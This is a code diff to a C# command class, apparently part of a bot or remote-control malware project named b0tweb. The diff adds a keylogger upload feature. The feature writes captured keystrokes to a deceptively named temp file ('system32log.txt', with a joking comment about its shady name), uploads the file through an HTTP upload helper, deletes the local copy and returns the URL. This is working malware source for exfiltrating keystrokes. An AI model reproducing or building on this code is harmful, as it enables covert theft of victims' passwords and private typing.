@@ -1,4 +1,7 @@
-﻿namespace b0tweb.Commands
+﻿using System;
+using System.IO;
+
+namespace b0tweb.Commands
 {
     class KeyloggerCommand : AbstractCommand
     {
@@ -20,18 +23,28 @@
             }
             else if (args[0].Equals("upload"))
             {
-                return this.uploadData();
+                return this.uploadLog(keylogger.Data);
             }
-
-            // TODO: store functionality?
-            // TODO: upload functionality
 
             return keylogger.Data;
         }
 
-        private string uploadData()
+        private string uploadLog(string log)
         {
-            return "";
+            // Totally not a shady name
+            string path = FileHelper.GetTemporaryFilePath("system32log.txt");
+
+            // Write the string array to a new file named "WriteLines.txt".
+            using (StreamWriter writer = new StreamWriter(path))
+            {
+                writer.WriteLine(log);
+            }
+
+            string url = HTTPUpload.Upload(path);
+
+            FileHelper.DeleteFile(path);
+
+            return url;
         }
     }
 }
